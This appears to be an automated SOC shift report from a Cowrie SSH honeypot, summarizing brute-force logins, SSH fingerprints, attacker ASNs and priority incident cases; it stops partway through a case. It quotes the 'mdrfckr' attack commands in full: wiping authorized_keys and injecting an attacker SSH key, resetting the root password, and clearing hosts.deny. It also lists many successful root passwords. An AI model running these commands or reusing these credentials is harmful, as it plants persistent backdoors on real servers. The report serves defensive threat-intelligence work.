# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-13 |
| **Generated At** | 2026-06-13T09:22:25Z |
| **Shift Time** | 09:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **665** |
| Confirmed Threats | **607** |
| False Positives Filtered | **58** (8.7%) |
| Unique Attacker IPs | **68** |
| Countries of Origin | **23** |
| High Severity Cases | **198** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **467** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **495** |
| Unique Credential Pairs | **274** |
| Unique Usernames | **149** |
| Unique Passwords | **226** |
| Successful Auth Pairs | **122** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 198 |
| `345gs5662d34` | 98 |
| `admin` | 13 |
| `ubuntu` | 7 |
| `deploy` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 98 |
| `3245gs5662d34` | 96 |
| `123456` | 20 |
| `123` | 14 |
| `password` | 11 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 98 |
| `root` | `3245gs5662d34` | 96 |
| `admin` | `` | 4 |
| `henry` | `123` | 3 |
| `root` | `Apple2020` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Zj123456` | `203.192.232.180` | 2026-06-13T04:35:39 |
| `root` | `3245gs5662d34` | `203.192.232.180` | 2026-06-13T04:35:40 |
| `root` | `Qwerty@2025` | `118.145.242.91` | 2026-06-13T04:42:05 |
| `root` | `1qwe` | `129.226.213.238` | 2026-06-13T04:45:15 |
| `root` | `3245gs5662d34` | `129.226.213.238` | 2026-06-13T04:45:18 |
| `root` | `!23456Qwerty` | `117.50.51.198` | 2026-06-13T04:45:51 |
| `root` | `3245gs5662d34` | `117.50.51.198` | 2026-06-13T04:45:58 |
| `root` | `zw@123456` | `129.226.213.238` | 2026-06-13T04:48:47 |
| `root` | `Qwerty@2025` | `129.226.213.238` | 2026-06-13T04:52:38 |
| `root` | `1235` | `129.226.213.238` | 2026-06-13T04:56:23 |
| `root` | `Sonu@123` | `129.226.213.238` | 2026-06-13T04:58:14 |
| `root` | `karkulka` | `103.13.206.152` | 2026-06-13T05:00:53 |
| `root` | `3245gs5662d34` | `103.13.206.152` | 2026-06-13T05:00:55 |
| `root` | `Root@2023` | `129.226.213.238` | 2026-06-13T05:03:46 |
| `root` | `12345678qwe` | `118.145.242.91` | 2026-06-13T05:06:16 |
| `root` | `123!@#Qwe` | `186.68.83.104` | 2026-06-13T05:08:40 |
| `root` | `3245gs5662d34` | `186.68.83.104` | 2026-06-13T05:08:47 |
| `root` | `admin2024` | `129.226.213.238` | 2026-06-13T05:17:09 |
| `root` | `opengate` | `129.226.213.238` | 2026-06-13T05:20:44 |
| `root` | `2020.` | `118.26.39.178` | 2026-06-13T05:21:05 |
| `root` | `3245gs5662d34` | `118.26.39.178` | 2026-06-13T05:21:08 |
| `root` | `235689` | `129.226.213.238` | 2026-06-13T05:26:25 |
| `root` | `karkulka` | `118.26.39.178` | 2026-06-13T05:26:54 |
| `root` | `12345678qwe` | `129.226.213.238` | 2026-06-13T05:28:18 |
| `root` | `1234@qwer` | `118.26.39.178` | 2026-06-13T05:34:56 |
| `root` | `Root` | `203.75.170.63` | 2026-06-13T05:44:05 |
| `root` | `Qwer123456.` | `160.251.233.37` | 2026-06-13T05:45:14 |
| `root` | `3245gs5662d34` | `160.251.233.37` | 2026-06-13T05:45:18 |
| `root` | `44444444` | `117.39.63.46` | 2026-06-13T05:46:21 |
| `root` | `@1qaz2wsx` | `160.251.233.37` | 2026-06-13T05:47:22 |
| `root` | `server123` | `160.251.233.37` | 2026-06-13T05:51:32 |
| `root` | `A12345678` | `212.64.19.167` | 2026-06-13T05:52:17 |
| `root` | `3245gs5662d34` | `212.64.19.167` | 2026-06-13T05:52:21 |
| `root` | `1qaz2wsx123` | `118.26.39.178` | 2026-06-13T05:52:37 |
| `root` | `QWE@123` | `160.251.233.37` | 2026-06-13T05:53:41 |
| `root` | `Windows10` | `212.64.19.167` | 2026-06-13T05:55:44 |
| `root` | `Ye123456` | `160.251.233.37` | 2026-06-13T05:55:45 |
| `root` | `root12!@` | `212.64.19.167` | 2026-06-13T05:58:13 |
| `root` | `Gfhjkm` | `160.251.233.37` | 2026-06-13T05:59:48 |
| `root` | `Asd123$` | `118.26.39.178` | 2026-06-13T06:00:33 |
| `root` | `Pass1234` | `212.64.19.167` | 2026-06-13T06:00:49 |
| `root` | `Admin$1234` | `212.64.19.167` | 2026-06-13T06:03:25 |
| `root` | `Asd@123456` | `160.251.233.37` | 2026-06-13T06:03:53 |
| `root` | `iddqd` | `118.26.39.178` | 2026-06-13T06:04:34 |
| `root` | `iwYpKi9&oE36.923967E-3103Xy` | `160.251.233.37` | 2026-06-13T06:08:08 |
| `root` | `azerty` | `160.251.233.37` | 2026-06-13T06:10:10 |
| `root` | `RootRoot` | `160.251.233.37` | 2026-06-13T06:12:13 |
| `root` | `Sw.123456` | `212.64.19.167` | 2026-06-13T06:13:34 |
| `root` | `Administrator1` | `160.251.233.37` | 2026-06-13T06:14:15 |
| `root` | `server10` | `212.64.19.167` | 2026-06-13T06:16:00 |
| `root` | `1qaz@wsx` | `160.251.233.37` | 2026-06-13T06:18:23 |
| `root` | `a123456a` | `212.64.19.167` | 2026-06-13T06:21:16 |
| `root` | `password` | `160.251.233.37` | 2026-06-13T06:22:31 |
| `root` | `123.abc` | `160.251.233.37` | 2026-06-13T06:24:32 |
| `root` | `2026.com` | `212.64.19.167` | 2026-06-13T06:26:27 |
| `root` | `0000` | `160.251.233.37` | 2026-06-13T06:26:39 |
| `root` | `welcome@2024` | `212.64.19.167` | 2026-06-13T06:29:01 |
| `root` | `lenovo` | `160.251.233.37` | 2026-06-13T06:41:04 |
| `root` | `1qazxsw2#EDCVFR$` | `212.64.19.167` | 2026-06-13T06:43:37 |
| `root` | `ita` | `212.64.19.167` | 2026-06-13T06:46:34 |
| `root` | `2801` | `197.248.159.62` | 2026-06-13T06:51:28 |
| `root` | `3245gs5662d34` | `197.248.159.62` | 2026-06-13T06:51:33 |
| `root` | `ABCabc` | `212.64.19.167` | 2026-06-13T06:51:41 |
| `root` | `daimler` | `114.220.176.69` | 2026-06-13T06:52:43 |
| `root` | `3245gs5662d34` | `114.220.176.69` | 2026-06-13T06:52:50 |
| `root` | `P@ssw0rd789` | `212.64.19.167` | 2026-06-13T07:01:58 |
| `root` | `Admin12` | `49.64.242.249` | 2026-06-13T07:04:06 |
| `root` | `3245gs5662d34` | `49.64.242.249` | 2026-06-13T07:04:17 |
| `root` | `Root-2026` | `172.214.209.153` | 2026-06-13T07:06:00 |
| `root` | `3245gs5662d34` | `172.214.209.153` | 2026-06-13T07:06:06 |
| `root` | `ZL123456@` | `172.214.209.153` | 2026-06-13T07:09:55 |
| `root` | `aaaAAA123` | `172.214.209.153` | 2026-06-13T07:11:57 |
| `root` | `Abc123456@` | `160.22.18.220` | 2026-06-13T07:13:23 |
| `root` | `3245gs5662d34` | `160.22.18.220` | 2026-06-13T07:13:26 |
| `root` | `fallout` | `172.214.209.153` | 2026-06-13T07:13:58 |
| `root` | `all4one` | `172.214.209.153` | 2026-06-13T07:16:01 |
| `root` | `zaq1.2wsx` | `50.6.228.111` | 2026-06-13T07:20:23 |
| `root` | `3245gs5662d34` | `50.6.228.111` | 2026-06-13T07:20:29 |
| `root` | `2801` | `172.214.209.153` | 2026-06-13T07:23:57 |
| `root` | `Ctyun@12345` | `50.6.228.111` | 2026-06-13T07:25:23 |
| `root` | `qwe123!@#QWE` | `50.6.228.111` | 2026-06-13T07:27:03 |
| `root` | `root2024` | `172.214.209.153` | 2026-06-13T07:30:07 |
| `root` | `zxc1230.` | `50.6.228.111` | 2026-06-13T07:32:20 |
| `root` | `Qwer123!` | `50.6.228.111` | 2026-06-13T07:39:02 |
| `root` | `root10` | `172.214.209.153` | 2026-06-13T07:40:15 |
| `root` | `David123` | `50.6.228.111` | 2026-06-13T07:44:13 |
| `root` | `nini` | `172.214.209.153` | 2026-06-13T07:46:12 |
| `root` | `Xz123456` | `172.214.209.153` | 2026-06-13T07:48:11 |
| `root` | `Admin123!@` | `172.214.209.153` | 2026-06-13T07:54:15 |
| `root` | `1234567890.` | `50.6.228.111` | 2026-06-13T07:54:19 |
| `root` | `labas123` | `50.6.228.111` | 2026-06-13T07:56:05 |
| `root` | `Tm!123456` | `102.221.30.186` | 2026-06-13T07:58:57 |
| `root` | `3245gs5662d34` | `102.221.30.186` | 2026-06-13T07:59:03 |
| `root` | `123qweASD!@` | `50.6.228.111` | 2026-06-13T08:02:54 |
| `root` | `Welcome@1234` | `101.47.158.56` | 2026-06-13T08:04:11 |
| `root` | `3245gs5662d34` | `101.47.158.56` | 2026-06-13T08:04:14 |
| `root` | `Admin123!@` | `154.83.13.181` | 2026-06-13T08:06:13 |
| `root` | `3245gs5662d34` | `154.83.13.181` | 2026-06-13T08:06:17 |
| `root` | `P@$$word` | `206.189.130.156` | 2026-06-13T08:08:25 |
| `root` | `3245gs5662d34` | `206.189.130.156` | 2026-06-13T08:08:27 |
| `root` | `abcd123456!` | `206.189.130.156` | 2026-06-13T08:10:26 |
| `root` | `Aa666888` | `206.189.130.156` | 2026-06-13T08:12:28 |
| `root` | `!QAZ2wsx123` | `206.189.130.156` | 2026-06-13T08:18:12 |
| `root` | `aq12wsde34rf` | `206.189.130.156` | 2026-06-13T08:23:54 |
| `root` | `Apple2020` | `43.128.70.79` | 2026-06-13T08:24:27 |
| `root` | `3245gs5662d34` | `43.128.70.79` | 2026-06-13T08:24:30 |
| `root` | `Redhat@2024` | `206.189.130.156` | 2026-06-13T08:25:55 |
| `root` | `Abc12345.` | `68.233.116.124` | 2026-06-13T08:32:43 |
| `root` | `3245gs5662d34` | `68.233.116.124` | 2026-06-13T08:32:44 |
| `root` | `zxcASD123` | `206.189.130.156` | 2026-06-13T08:33:53 |
| `root` | `abcabc123!@#` | `68.233.116.124` | 2026-06-13T08:40:19 |
| `root` | `1234qwerQWER` | `68.233.116.124` | 2026-06-13T08:42:08 |
| `root` | `Beijing123` | `206.189.130.156` | 2026-06-13T08:45:30 |
| `root` | `Qq!123456` | `68.233.116.124` | 2026-06-13T08:46:40 |
| `root` | `Welcome@1234` | `206.189.130.156` | 2026-06-13T08:49:22 |
| `root` | `Qwerty7890` | `68.233.116.124` | 2026-06-13T08:50:32 |
| `root` | `Apple2020` | `68.233.116.124` | 2026-06-13T08:52:29 |
| `root` | `postgres@1234` | `68.233.116.124` | 2026-06-13T08:56:23 |
| `root` | `Apple2020` | `122.162.146.24` | 2026-06-13T08:57:46 |
| `root` | `Asd123` | `206.189.130.156` | 2026-06-13T08:59:01 |
| `root` | `k9jt3d` | `206.189.130.156` | 2026-06-13T09:00:59 |
| `root` | `Qwerty7890` | `122.162.146.24` | 2026-06-13T09:07:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **665** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 545 |
| AsyncSSH (Python) | 3 |
| Go SSH scanner | 3 |
| OpenSSH | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 484 | 25 |
| `671ac49b8bd6...` | Mirai/variant | 29 | 1 |
| `af8223ac9914...` | libssh-based | 20 | 1 |
| `03a80b21afa8...` | Modern SSH client | 7 | 3 |
| `fda360b1b4f4...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 484 | 25 | Mirai/variant |
| `671ac49b8bd6...` | libssh | 29 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 20 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 7 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `fda360b1b4f4...` | AsyncSSH (Python) | 3 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 96 | 20 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:NmIkWVwd8GPw"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `122.162.146.24`, `118.145.242.91`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `49.64.242.249`, `43.128.70.79`, `160.22.18.220`, `50.6.228.111`, `129.226.213.238`, `203.192.232.180`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **68** |
| Unique ASNs | **49** |
| High-Risk ASNs | **36** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (198)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d58894034e16

| Field | Detail |
|---|---|
| **Source IP** | `203.192.232[.]180` |
| **First Seen** | 2026-06-13 04:35 |
| **Last Seen** | 2026-06-13 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:35:39` | `cowrie.session.connect` |
| `2026-06-13 04:35:39` | `cowrie.client.version` |
| `2026-06-13 04:35:39` | `cowrie.client.kex` |
| `2026-06-13 04:35:39` | `cowrie.login.success` |
| `2026-06-13 04:35:39` | `cowrie.session.params` |
| `2026-06-13 04:35:39` | `cowrie.command.input` |
| `2026-06-13 04:35:39` | `cowrie.command.failed` |
| `2026-06-13 04:35:39` | `cowrie.log.closed` |
| `2026-06-13 04:35:39` | `cowrie.session.params` |
| `2026-06-13 04:35:39` | `cowrie.command.input` |
| `2026-06-13 04:35:39` | `cowrie.session.file_download` |
| `2026-06-13 04:35:39` | `cowrie.log.closed` |
| `2026-06-13 04:35:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.232[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.232[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e26e4946fa

| Field | Detail |
|---|---|
| **Source IP** | `203.192.232[.]180` |
| **First Seen** | 2026-06-13 04:35 |
| **Last Seen** | 2026-06-13 04:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:35:40` | `cowrie.session.connect` |
| `2026-06-13 04:35:40` | `cowrie.client.version` |
| `2026-06-13 04:35:40` | `cowrie.client.kex` |
| `2026-06-13 04:35:40` | `cowrie.login.success` |
| `2026-06-13 04:35:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.232[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.232[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb4516d7bd4

| Field | Detail |
|---|---|
| **Source IP** | `118.145.242[.]91` |
| **First Seen** | 2026-06-13 04:42 |
| **Last Seen** | 2026-06-13 04:47 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:42:03` | `cowrie.session.connect` |
| `2026-06-13 04:42:03` | `cowrie.client.version` |
| `2026-06-13 04:42:04` | `cowrie.client.kex` |
| `2026-06-13 04:42:05` | `cowrie.login.success` |
| `2026-06-13 04:42:05` | `cowrie.session.params` |
| `2026-06-13 04:42:05` | `cowrie.command.input` |
| `2026-06-13 04:42:05` | `cowrie.command.failed` |
| `2026-06-13 04:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.242[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.145.242[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-636925390757

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:45 |
| **Last Seen** | 2026-06-13 04:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:45:15` | `cowrie.session.connect` |
| `2026-06-13 04:45:15` | `cowrie.client.version` |
| `2026-06-13 04:45:15` | `cowrie.client.kex` |
| `2026-06-13 04:45:15` | `cowrie.login.success` |
| `2026-06-13 04:45:15` | `cowrie.session.params` |
| `2026-06-13 04:45:15` | `cowrie.command.input` |
| `2026-06-13 04:45:15` | `cowrie.command.failed` |
| `2026-06-13 04:45:16` | `cowrie.log.closed` |
| `2026-06-13 04:45:16` | `cowrie.session.params` |
| `2026-06-13 04:45:16` | `cowrie.command.input` |
| `2026-06-13 04:45:16` | `cowrie.session.file_download` |
| `2026-06-13 04:45:16` | `cowrie.log.closed` |
| `2026-06-13 04:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f852114be1b

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:45 |
| **Last Seen** | 2026-06-13 04:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:45:17` | `cowrie.session.connect` |
| `2026-06-13 04:45:17` | `cowrie.client.version` |
| `2026-06-13 04:45:17` | `cowrie.client.kex` |
| `2026-06-13 04:45:18` | `cowrie.login.success` |
| `2026-06-13 04:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79384a96ee87

| Field | Detail |
|---|---|
| **Source IP** | `117.50.51[.]198` |
| **First Seen** | 2026-06-13 04:45 |
| **Last Seen** | 2026-06-13 04:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:45:50` | `cowrie.session.connect` |
| `2026-06-13 04:45:50` | `cowrie.client.version` |
| `2026-06-13 04:45:50` | `cowrie.client.kex` |
| `2026-06-13 04:45:51` | `cowrie.login.success` |
| `2026-06-13 04:45:51` | `cowrie.session.params` |
| `2026-06-13 04:45:51` | `cowrie.command.input` |
| `2026-06-13 04:45:51` | `cowrie.command.failed` |
| `2026-06-13 04:45:52` | `cowrie.log.closed` |
| `2026-06-13 04:45:52` | `cowrie.session.params` |
| `2026-06-13 04:45:52` | `cowrie.command.input` |
| `2026-06-13 04:45:52` | `cowrie.session.file_download` |
| `2026-06-13 04:45:52` | `cowrie.log.closed` |
| `2026-06-13 04:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.51[.]198` to AbuseIPDB if not already reported
- [ ] Block `117.50.51[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd1661336102

| Field | Detail |
|---|---|
| **Source IP** | `117.50.51[.]198` |
| **First Seen** | 2026-06-13 04:45 |
| **Last Seen** | 2026-06-13 04:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:45:57` | `cowrie.session.connect` |
| `2026-06-13 04:45:57` | `cowrie.client.version` |
| `2026-06-13 04:45:57` | `cowrie.client.kex` |
| `2026-06-13 04:45:58` | `cowrie.login.success` |
| `2026-06-13 04:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.51[.]198` to AbuseIPDB if not already reported
- [ ] Block `117.50.51[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c19558f794

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:48 |
| **Last Seen** | 2026-06-13 04:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
